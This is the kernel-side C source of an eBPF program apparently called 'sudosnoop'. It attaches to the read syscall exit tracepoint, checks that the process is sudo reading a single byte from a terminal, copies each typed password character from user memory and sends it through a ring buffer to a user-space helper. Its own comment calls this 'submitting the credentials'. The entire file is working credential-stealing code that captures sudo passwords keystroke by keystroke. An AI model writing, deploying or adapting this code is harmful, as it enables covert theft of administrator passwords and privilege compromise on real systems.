#include "vmlinux.h"

#include "sudosnoop.h"

#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// will be populated with the real kernel address by libbpf at load time
extern const void tty_fops __ksym;

// for submitting the credentials to user space
struct {
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 1024);
} rb SEC(".maps");

/* kernel function signature
 * SYSCALL_DEFINE3(read, unsigned int, fd,
 * 	char __user *, buf,
 * 	size_t, count)
 */
SEC("tp/syscalls/sys_exit_read")
int handle_tp(struct trace_event_raw_sys_exit* ctx)
{
  struct event* e = NULL;
  char buf[TASK_COMM_LEN] = { 0 };
  struct task_struct* current = NULL;
  struct pt_regs* regs = NULL;
  int _fd = 0;
  struct file** filp = NULL;
  struct file* f = NULL;
  struct file_operations* f_op = 0;
  __u64 ubuf = 0;

  // check comm: we only want to hook sudo
  if (bpf_get_current_comm((void*)buf, sizeof(buf))) {
    bpf_printk("error: bpf_get_current_comm");
    return 0;
  }
  if (__builtin_memcmp(buf, "sudo", 4)) {
    return 0;
  }

  // check return value: sudo gets one byte at a time
  if (ctx->ret != 1) {
    return 0;
  }

  // get task struct
  if (!(current = bpf_get_current_task_btf())) {
    bpf_printk("error: bpf_get_current_task_btf");
    return 0;
  }

  // get saved user CPU context
  if (!(regs = (struct pt_regs*)bpf_task_pt_regs(current))) {
    bpf_printk("error: bpf_task_pt_regs");
    return 0;
  }

  // check nr. of requested bytes: sudo requests one byte at a time
  if ((int)PT_REGS_PARM3_CORE_SYSCALL(regs) != 1) {
    return 0;
  }

  // check file operations of the file backing the fd that was read:
  // we expect them to be tty_fops, both, via local login and ssh
  // 1. map fd number to struct file
  _fd = (int)PT_REGS_PARM1_CORE_SYSCALL(regs);
  filp = (struct file**)BPF_CORE_READ(current, files, fdt, fd) + _fd;
  if (!filp) {
    bpf_printk("error: fd to filp");
    return 0;
  }
  if (bpf_probe_read_kernel(&f, sizeof(f), filp) || f == NULL) {
    bpf_printk("error: filp to file");
    return 0;
  }
  // 2. check file operations
  if (!(f_op = (struct file_operations*)BPF_CORE_READ(f, f_op))) {
    bpf_printk("error: file to f_op");
    return 0;
  }
  if (&tty_fops != (void*)f_op) {
    return 0;
  }

  /*
   * IFF we make it here, we are about to return to "sudo" after a
   * password read:
   *   read the byte that we wrote to user space and send it to our
   *   user space helper process
   */

  // fetch address of user buffer
  if (!(ubuf = PT_REGS_PARM2_CORE_SYSCALL(regs))) {
    bpf_printk("error: ubuf %lx", ubuf);
    return 0;
  }

  // fetch character that was read
  if (bpf_probe_read_user((void*)buf, 1, (void*)ubuf) < 0) {
    bpf_printk("error: bpf_probe_read_user");
    return 0;
  } else {
    bpf_printk("info: read <%s>", buf);
  }

  // submit it to user space
  if (!(e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0))) {
    bpf_printk("error: bpf_ringbuf_reserve");
    return 0;
  }
  e->c = buf[0];
  bpf_ringbuf_submit(e, 0);
  return 0;
}
